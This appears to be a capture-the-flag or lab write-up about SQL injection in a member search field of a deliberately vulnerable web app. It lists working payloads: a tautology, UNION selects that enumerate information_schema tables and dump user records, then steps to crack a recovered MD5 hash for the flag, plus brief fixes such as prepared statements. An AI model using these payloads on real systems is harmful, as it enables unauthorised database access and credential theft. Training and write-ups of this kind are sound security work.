# 06-SQL_Member_Search

The search filed is vulnerable to sql injections

## The approach

- Go to http://192.168.42.238/index.php?

- On the search field, type `1 or 1=1` and press search button 

- Type this union command on the filed: `1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()`. this returns table name which is users.

- type on the filed: ` -1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users`. this returns a list names and surnames by ID.

- from the results you get ( " 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28 " decrypt code using MD5 decrypt, then run sha256 on lowercased password: flag is result )

## The Exploit #

Users can exploit and destroy sensitive information on your database

## The solution

- Use prepared statements in the backend to prevent users from making queries with user input
- validate user inputs from back end before proceeding.

## Resources
https://www.md5online.org/md5-decrypt.html  
sha256-hash-generator/ 


https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#InlineSamples